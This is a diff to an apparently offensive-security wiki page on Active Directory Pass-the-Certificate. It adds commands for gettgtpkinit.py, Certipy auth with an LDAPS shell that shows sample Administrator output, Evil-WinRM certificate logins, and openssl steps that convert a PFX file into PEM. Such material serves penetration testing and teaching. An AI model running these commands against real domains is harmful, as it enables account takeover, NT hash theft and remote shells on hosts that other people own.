@@ -19,6 +19,8 @@ The "certificate + private key" pair is usually used in the following manner
 
 {% tabs %}
 {% tab title="UNIX-like" %}
+#### PKINITtools
+
 From UNIX-like systems, [Dirk-jan](https://twitter.com/\_dirkjan)'s [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/) tool to request a TGT (Ticket Granting Ticket) for the target object. That tool supports the use of the certificate in multiple forms.
 
 ```python
@@ -32,23 +34,31 @@ gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SA
 gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
 ```
 
-Alternatively, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used for the same purpose.
+The ticket obtained can then be used to
+
+* authenticate with [pass-the-cache](ptc.md)
+* conduct an [UnPAC-the-hash](unpac-the-hash.md) attack. This can be done with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/).
+* obtain access to the account's SPN with an S4U2Self. This can be done with [gets4uticket.py](https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools).
+
+#### Certipy
+
+When using Certipy for Pass-the-Certificate, it automatically does [UnPAC-the-hash](unpac-the-hash.md) to recover the account's NT hash, in addition to saving the TGT obtained.
 
 ```bash
-certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
+certipy auth -pfx <PATH_TO_PFX_CERT> -dc-ip <DC_IP> -username <user> -domain <DOMAIN_FQDN>
 ```
 
 {% hint style="info" %}
 If you have this error:**`KDC_ERR_PADATA_TYPE_NOSUPP`**when requesting PKINIT, it may be an indication that your targeted KDCs do not have certificates with the necessary EKU (Extended Key Usages). \
 More specificly, If a KDC must support smart card logon, its certificate must have the `Smart Card Logon` EKU\
 \
-**You can use your certificate to logon on LDAPS via Schannel**
+**You can use your certificate to connect to LDAPS via Schannel.**
 {% endhint %}
 
-Authentication via Schannel is supported by [certipy-ad](https://github.com/ly4k/Certipy):
+Authentication via Schannel is also supported by [Certipy](https://github.com/ly4k/Certipy), lt will open a connection to LDAPS and drop into an interactive shell with limited LDAP commands
 
 ```bash
-certipy auth -pfx administrator.pfx -username 'administrator' -domain 'contoso.local' -ldap-shell -ldap-scheme ldaps -dc-ip $DC_IP
+certipy auth -pfx <PATH_TO_PFX_CERT> -username <user> -domain <DOMAIN_FQDN> -ldap-shell -ldap-scheme ldaps -dc-ip $DC_IP
 [*] Connecting to 'ldaps://10.10.10.10:636'
 [*] Authenticated to '10.10.10.10' as: u:CONTOSO.LOCAL\Administrator
 Type help for list of commands
@@ -59,18 +69,26 @@ Type help for list of commands
 Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.
 
 ```bash
-certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
+certipy cert -export -pfx <PATH_TO_PFX_CERT> -password <CERT_PASSWORD> -out <unprotected.pfx>
 ```
 
-The ticket obtained can then be used to
+#### Evil-WinRm
 
-* authenticate with [pass-the-cache](ptc.md)
-* conduct an [UnPAC-the-hash](unpac-the-hash.md) attack. This can be done with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/).
-* obtain access to the account's SPN with an S4U2Self. This can be done with [gets4uticket.py](https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools).
+[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) uses the [WinRM](../../../redteam/pivoting/winrm.md) protocol based on [Windows Management Instrumentation (WMI)](../../../redteam/pivoting/remote-wmi.md) to give us an interactive shell on a Windows host. Winrm Supports PKINIT, so we can authenticate with a certificate.
 
-{% hint style="info" %}
-When using Certipy for Pass-the-Certificate, it automatically does [UnPAC-the-hash](unpac-the-hash.md) to recover the account's NT hash, in addition to saving the TGT obtained.
-{% endhint %}
+```bash
+evil-winrm -i <TARGET_IP> -c <PATH_TO_PEM_CERT> -k <PATH_TO_PEM_KEY> -S -r <DOMAIN_REALM>
+```
+
+Evil WinRM doesn't directly support PFX files and need a PEM certificate and private key. The following commands can be used to convert a PFX file in PEM formats
+
+```bash
+# Exctract PEM certificate
+openssl pkcs12 -in <PATH_TO_PFX_CERT> -clcerts -nokeys -out <PATH_TO_NEW_PEM_CERT>
+
+# Extrcat PEM key
+openssl pkcs12 -in <PATH_TO_PFX_CERT> -nocerts -noenc -out <PATH_TO_NEW_PEM_KEY>
+```
 {% endtab %}
 
 {% tab title="Windows" %}
